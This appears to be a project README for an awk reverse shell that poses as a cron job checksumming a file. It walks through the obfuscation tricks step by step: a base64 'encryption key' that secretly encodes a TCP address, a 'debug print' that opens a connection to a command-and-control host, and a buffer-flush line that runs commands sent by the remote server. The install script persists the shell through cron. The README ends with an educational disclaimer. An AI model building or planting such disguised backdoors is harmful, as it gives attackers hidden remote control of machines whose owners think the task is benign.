# awkwrd

An awk reverse shell.

## Purpose

The `checkrc.awk` command periodically calls out to a remote server and executes its commands. It is disguised as a recurring task to take the shasum of a file (e.g. to track when it is modified).

## Install
This command creates the main `checkrc.awk` file, an encryption key, and adds settings to cron.
```
./install.sh
```

## How it works

Before we dig into the code, we need some background on the encryption key that gets generated.

### The "encryption key"

After running `./install.sh`, a base64-encoded file should be saved to `$HOME/.checkrc/.enc.key`. This looks like a stream of random bytes, but it's actually been carefully crafted to encode an awk-style TCP URI (see [awk Network Programming](https://www.gnu.org/software/gawk/manual/html_node/TCP_002fIP-Networking.html)).

Let's try decoding the file and only reading the even-numbered columns...
```bash
$ base64 -d $HOME/.checkrc/.enc.key | awk '{print $2$4$6$8$10$12$14$16$18$20}'
/inet/tcp/0/localhost/8888
```

### Getting the Host URL
The first few lines of `checkrc.awk` simply read the key we see above, with some indirection around reading the even-numbered columns. As we know, we get a hostname out of this. Meanwhile, the reader believes we have loaded a private key into memory.
```awk
# load key into memory two bytes at a time
("base64 --decode $HOME/.enc.key" | getline)
for (i=2;i<=NF;i+=2) key=key$i
```

### Sending the Request
The entire "HMAC generation" step exists mostly for indirection, except for the print statement. Those familiar with `awk` coprocesses and networking will note that this print statement actually opens a connection to our host above (`localhost:8888`) and sends the text `"starting with key "`.

Our command and control server would be set up to handle this input, while to the reader, this looks like a harmless debug statement.
```awk
# generate hmac of bash profile and save to logfile
print "starting with key " |& key
system(sprintf("openssl dgst -sha1 -hmac %s ~/.bashrc >>$HOME/shasums.txt", key))
```

### Remote Execution
This is the core of the script that reads data from the remote server and executes it. We hide it by talking about traditionally confusing concepts, but it's a difficult part to fully obfuscate (I'm open to suggestions).

```awk
# flush buffers and clean up file descriptors
close(key |&getline fd)
print "closed " |& fd
```

Let's break down what's going on here.
1. `key |& getline fd` reads a response from the host (`localhost:8888`), and populates the variable `fd` with the response data.
2. `close()` actually does close the connection, but evaluates step (1) first.
3. `print "closed " |& fd` runs the command received from the remote server. It does this by sending an arbitrary string to a process that runs the received command. This means that the received command should expect data on STDIN and handle it accordingly.

## Remote Server

This client assumes you have a remote server that can issue commands upon request. `server.awk` exists as a test server that sends remote tasks to be executed on the target host upon request. Creating a more configurable server is outside the scope of this project.

## Disclaimer

This project is for educational and research purposes only. The author is not responsible for individuals who misuse these materials for illegal purposes.
